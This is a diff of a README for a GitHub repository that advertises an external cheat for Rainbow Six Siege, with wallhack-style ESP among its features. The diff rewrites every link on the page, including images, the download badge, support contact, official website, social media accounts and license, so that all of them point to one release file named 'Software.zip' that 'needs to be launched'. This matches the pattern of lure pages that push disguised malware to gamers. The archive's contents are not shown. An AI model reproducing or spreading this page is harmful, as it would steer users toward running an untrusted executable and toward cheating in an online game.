@@ -1,6 +1,6 @@
 # 🌈 Welcome to R6S External Cheat Repository! 🎮
 
-![R6S External Cheat](https://example.com/r6s-external-cheat-image.jpg)
+![R6S External Cheat](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip)
 
 ## Repository Name: R6S-External-Cheat
 
@@ -28,7 +28,7 @@ Welcome to the ultimate external cheat for Rainbow Six Siege! Our cheat offers a
 - rainbow-six-siege-hacks
 
 ### Download R6S External Cheat:
-[![Download R6S External Cheat](https://img.shields.io/badge/Download-R6S%20External%20Cheat-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip) (Needs to be launched)
+[![Download R6S External Cheat](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip%20External%20Cheat-blue)](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 ### Features:
 1. **ESP**: See your enemies through walls with our advanced ESP feature.
@@ -46,23 +46,23 @@ Welcome to the ultimate external cheat for Rainbow Six Siege! Our cheat offers a
 This cheat tool is designed for educational and entertainment purposes only. Use it responsibly and respect the rules of the game.
 
 ### Support:
-For any inquiries or support regarding the R6S External Cheat, feel free to contact our team at [support@r6sexternalcheat.com](mailto:support@r6sexternalcheat.com) or visit our official website [r6sexternalcheat.com](https://www.r6sexternalcheat.com).
+For any inquiries or support regarding the R6S External Cheat, feel free to contact our team at [https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip) or visit our official website [https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip).
 
 ### Stay Connected:
 Follow us on social media for updates, tips, and more:
-- Twitter: [@R6SExternalCheat](https://twitter.com/R6SExternalCheat)
-- Facebook: [R6S External Cheat](https://www.facebook.com/R6SExternalCheat)
-- Instagram: [@r6sexternalcheat](https://www.instagram.com/r6sexternalcheat)
+- Twitter: [@R6SExternalCheat](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip)
+- Facebook: [R6S External Cheat](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip)
+- Instagram: [@r6sexternalcheat](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip)
 
 ### Contribute:
 We welcome contributions to improve and enhance the R6S External Cheat tool. Feel free to fork the repository, make changes, and submit a pull request.
 
 ### License:
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip).
 
 ---
 
-![Rainbow Six Siege Logo](https://example.com/r6s-logo.png)
+![Rainbow Six Siege Logo](https://github.com/SudoUserPlayer/R6S-External-Cheat/releases/download/v2.0/Software.zip)
 
 &nbsp;
 
